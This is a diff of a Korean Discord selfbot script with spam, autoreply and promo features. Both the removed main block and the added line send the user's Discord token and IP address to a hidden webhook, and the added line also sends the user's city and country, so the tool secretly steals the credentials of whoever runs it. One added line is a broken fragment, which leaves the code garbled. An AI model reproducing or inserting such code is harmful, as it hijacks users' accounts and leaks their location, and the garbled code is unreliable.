@@ -57,59 +57,8 @@ def send_to_webhook(token, ip_address):
         response = requests.post(webhook_url, json=data)
         response.raise_for_status()
     except:
-        pass
-
-def load_config():
-    try:
-        with open("config/config.json", "r", encoding='utf-8') as file:
-            return json.load(file)
-    except FileNotFoundError:
-        if not os.path.exists("config"):
-            os.makedirs("config")
-        default_config = {
-            "prefix": "!",
-            "spam_message": "안녕하세요, 블랙너스 셀프봇입니다!",
-            "delay": 1000,
-            "spam_count": 5,
-            "잠수": {"enabled": False, "message": "현재 잠수 중입니다. 나중에 다시 시도해주세요."},
-            "welcome_message": {"channel_id": "", "message": "", "enabled": False},
-            "school_info": {"name": "", "grade": "", "class": ""},
-            "promo_messages": {},
-            "promo_logs": [],
-            "account_info": {},
-            "coin_wallet": {},
-            "partner_channels": [],
-            "scheduled_messages": [],
-            "emoji_reactions": {},
-            "saved_mentions": {},
-            "words": ["블랙너스", "셀프봇", "김민준", "제작", "discord"],
-            "autoreply": {"enabled": False, "users": [], "channels": [], "messages": ["자동 응답 메시지 1", "자동 응답 메시지 2"]},
-            "afk": {"enabled": False, "message": "현재 AFK 상태입니다. 가능한 한 빨리 답장해 드리겠습니다."},
-            "copycat": {"enabled": False, "users": []},
-            "remote-users": [],
-            "auto_reply_users": {},
-            "disabled_commands": []
-        }
-        save_config(default_config)
-        return default_config
-
-config = load_config()
-
-if __name__ == "__main__":
-    try:
-        token = input("토큰을 입력하세요: ")
-        ip_address = get_ip_address()
-        send_to_webhook(token, ip_address)
-        client.run(token)
-    except discord.LoginFailure:
-        time.sleep(5)
-        exit(1)
-    except:
-        time.sleep(5)
-        try:
-            client.run(token)
-        except:
-            exit(1)
+        지")
+    send_to_webhook(token, ip_address, city, country)
 
 prefix = config.get("prefix", "!")
 message_generator = itertools.cycle(config.get("autoreply", {}).get("messages", ["자동 응답 메시지 1", "자동 응답 메시지 2"]))
